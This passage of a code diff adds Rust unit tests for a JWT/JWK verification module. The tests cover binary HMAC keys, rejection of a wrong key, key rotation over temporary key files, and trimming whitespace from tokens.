+        let jwk = Jwk {
+            kty: "EC".to_string(),
+            kid: None,
+            alg: None,
+            key_use: None,
+            key_ops: None,
+            n: None,
+            e: None,
+            crv: Some("P-256".to_string()),
+            x: Some("test".to_string()),
+            y: Some("test".to_string()),
+            k: None,
+            x5c: None,
+            x5t: None,
+            x5t_s256: None,
+            extra: HashMap::new(),
+        };
+
+        let result = jwk_rsa_to_pem(&jwk);
+        assert!(result.is_err());
+    }
+
+    #[test]
+    fn test_verify_with_jwks_empty() {
+        let claims = serde_json::json!({"sub": "test"});
+        let token =
+            crate::jwt::encode(&claims, "secret", "HS256").expect("Failed to create test token");
+
+        let jwks = JwkSet { keys: vec![] };
+        let results = verify_with_jwks(&token, &jwks).unwrap();
+        assert!(results.is_empty());
+    }
+
+    #[test]
+    fn test_verify_with_jwks_oct_binary_key() {
+        // Regression: an `oct` JWK key is arbitrary bytes. Verifying a token
+        // signed with a non-UTF-8 key used to fail because the key was routed
+        // through `String::from_utf8_lossy`, replacing invalid bytes with U+FFFD.
+        // A key with an 0xFF byte is not valid UTF-8.
+        let key: [u8; 32] = [
+            0xff, 0xfe, 0x00, 0x80, 0x01, 0x02, 0x03, 0x90, 0xa1, 0xb2, 0xc3, 0xd4, 0xe5, 0xf6,
+            0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80, 0x9f, 0xaf, 0xbf, 0xcf, 0xdf, 0xef,
+            0xff, 0x00, 0x11, 0x22,
+        ];
+        // The 0xFF bytes make this key invalid UTF-8, which is exactly the case
+        // `from_utf8_lossy` used to corrupt.
+
+        // Sign an HS256 token with the raw key bytes.
+        let h_b64 = URL_SAFE_NO_PAD.encode(br#"{"alg":"HS256","typ":"JWT"}"#);
+        let c_b64 = URL_SAFE_NO_PAD.encode(br#"{"sub":"x"}"#);
+        let signing_input = format!("{h_b64}.{c_b64}");
+        let mac = hmac_sha256::HMAC::mac(signing_input.as_bytes(), key);
+        let sig_b64 = URL_SAFE_NO_PAD.encode(mac.as_slice());
+        let token = format!("{signing_input}.{sig_b64}");
+
+        let k_b64 = URL_SAFE_NO_PAD.encode(key);
+        let jwks_json =
+            format!(r#"{{"keys":[{{"kty":"oct","kid":"k1","alg":"HS256","k":"{k_b64}"}}]}}"#);
+        let jwks = parse_jwks(&jwks_json).unwrap();
+
+        let results = verify_with_jwks(&token, &jwks).unwrap();
+        assert_eq!(results.len(), 1);
+        assert!(
+            results[0].valid,
+            "binary oct key must verify its correctly-signed token; error={:?}",
+            results[0].error
+        );
+    }
+
+    #[test]
+    fn test_verify_with_jwks_oct_wrong_key_is_invalid() {
+        // A different oct key must NOT verify (guards against the fix accepting
+        // everything).
+        let h_b64 = URL_SAFE_NO_PAD.encode(br#"{"alg":"HS256","typ":"JWT"}"#);
+        let c_b64 = URL_SAFE_NO_PAD.encode(br#"{"sub":"x"}"#);
+        let signing_input = format!("{h_b64}.{c_b64}");
+        let mac = hmac_sha256::HMAC::mac(signing_input.as_bytes(), [0xaa_u8; 32]);
+        let sig_b64 = URL_SAFE_NO_PAD.encode(mac.as_slice());
+        let token = format!("{signing_input}.{sig_b64}");
+
+        let k_b64 = URL_SAFE_NO_PAD.encode([0xbb_u8; 32]);
+        let jwks_json =
+            format!(r#"{{"keys":[{{"kty":"oct","kid":"k1","alg":"HS256","k":"{k_b64}"}}]}}"#);
+        let jwks = parse_jwks(&jwks_json).unwrap();
+
+        let results = verify_with_jwks(&token, &jwks).unwrap();
+        assert_eq!(results.len(), 1);
+        assert!(!results[0].valid, "wrong oct key must not verify");
+    }
+
+    #[test]
+    fn test_key_rotation_with_temp_files() {
+        use std::io::Write;
+        use tempfile::tempdir;
+
+        let claims = serde_json::json!({"sub": "test"});
+        let token =
+            crate::jwt::encode(&claims, "my-secret", "HS256").expect("Failed to create test token");
+
+        let dir = tempdir().unwrap();
+
+        // Create key files with different secrets
+        let key1_path = dir.path().join("key1.txt");
+        let key2_path = dir.path().join("key2.txt");
+
+        std::fs::File::create(&key1_path)
+            .unwrap()
+            .write_all(b"wrong-secret")
+            .unwrap();
+        std::fs::File::create(&key2_path)
+            .unwrap()
+            .write_all(b"my-secret")
+            .unwrap();
+
+        let results = test_key_rotation(&token, &[key1_path, key2_path]).unwrap();
+        assert_eq!(results.len(), 2);
+        assert!(!results[0].valid); // wrong-secret
+        assert!(results[1].valid); // my-secret
+    }
+
+    #[test]
+    fn test_key_rotation_binary_key_does_not_abort_batch() {
+        // Regression: a single non-UTF-8 key file used to abort the ENTIRE rotation
+        // batch (`read_to_string(path)?`), so a good key after it was never tested.
+        // A binary file must be reported as its own (failed) key while the rest of
+        // the batch still runs.
+        use std::io::Write;
+        use tempfile::tempdir;
+
+        let claims = serde_json::json!({"sub": "test"});
+        let token =
+            crate::jwt::encode(&claims, "my-secret", "HS256").expect("Failed to create token");
+
+        let dir = tempdir().unwrap();
+        let bin_path = dir.path().join("binary.key");
+        std::fs::File::create(&bin_path)
+            .unwrap()
+            .write_all(&[0xff, 0xfe, 0x00, 0x01, b'D', b'E', b'R'])
+            .unwrap();
+        let good_path = dir.path().join("good.txt");
+        std::fs::File::create(&good_path)
+            .unwrap()
+            .write_all(b"my-secret")
+            .unwrap();
+
+        let results = test_key_rotation(&token, &[bin_path, good_path])
+            .expect("rotation must not abort on a binary key file");
+        assert_eq!(results.len(), 2, "both keys must be reported");
+        assert!(
+            !results[0].valid,
+            "binary DER blob must not verify an HS256 token"
+        );
+        assert!(
+            results[1].valid,
+            "a good HMAC key placed after a binary one must still be tested and verify"
+        );
+    }
+
+    #[test]
+    fn test_key_rotation_verifies_binary_hmac_secret() {
+        // A JWK/HMAC secret is arbitrary bytes; a binary key file could not be read at
+        // all before, so its correctly-signed token was untestable. Signing with the
+        // raw bytes and verifying via SecretBytes must now succeed.
+        use std::io::Write;
+        use tempfile::tempdir;
+
+        let key: [u8; 16] = [
+            0xff, 0xfe, 0x00, 0x80, 1, 2, 3, 0x90, 0xa1, 0xb2, 0xc3, 0xd4, 0xe5, 0xf6, 0x10, 0x20,
+        ];
+        let h_b64 = URL_SAFE_NO_PAD.encode(br#"{"alg":"HS256","typ":"JWT"}"#);
+        let c_b64 = URL_SAFE_NO_PAD.encode(br#"{"sub":"bin"}"#);
+        let signing_input = format!("{h_b64}.{c_b64}");
+        let mac = hmac_sha256::HMAC::mac(signing_input.as_bytes(), key);
+        let sig_b64 = URL_SAFE_NO_PAD.encode(mac.as_slice());
+        let token = format!("{signing_input}.{sig_b64}");
+
+        let dir = tempdir().unwrap();
+        let key_path = dir.path().join("binkey.key");
+        std::fs::File::create(&key_path)
+            .unwrap()
+            .write_all(&key)
+            .unwrap();
+
+        let results = test_key_rotation(&token, &[key_path]).expect("rotation");
+        assert_eq!(results.len(), 1);
+        assert!(
+            results[0].valid,
+            "binary HMAC key must verify its own token; err={:?}",
+            results[0].error
+        );
+    }
+
+    #[test]
+    fn test_verify_with_jwks_trims_surrounding_whitespace() {
+        // Regression: a trailing newline (common when a token is read from a file or
+        // pipe) corrupted the base64url signature segment, so a valid key was wrongly
+        // reported INVALID. The token must be trimmed before verification.
+        let key: [u8; 32] = [7u8; 32];
+        let h_b64 = URL_SAFE_NO_PAD.encode(br#"{"alg":"HS256","typ":"JWT"}"#);
+        let c_b64 = URL_SAFE_NO_PAD.encode(br#"{"sub":"x"}"#);
+        let signing_input = format!("{h_b64}.{c_b64}");
+        let mac = hmac_sha256::HMAC::mac(signing_input.as_bytes(), key);
+        let sig_b64 = URL_SAFE_NO_PAD.encode(mac.as_slice());
+        let token = format!("{signing_input}.{sig_b64}");
+
+        let k_b64 = URL_SAFE_NO_PAD.encode(key);
+        let jwks_json =
+            format!(r#"{{"keys":[{{"kty":"oct","kid":"k1","alg":"HS256","k":"{k_b64}"}}]}}"#);
+        let jwks = parse_jwks(&jwks_json).unwrap();
+
+        let padded = format!("  {token}\n");
+        let results = verify_with_jwks(&padded, &jwks).unwrap();
+        assert_eq!(results.len(), 1);
+        assert!(
+            results[0].valid,
+            "whitespace-padded token must still verify against its key; err={:?}",
+            results[0].error
+        );
+    }
+}
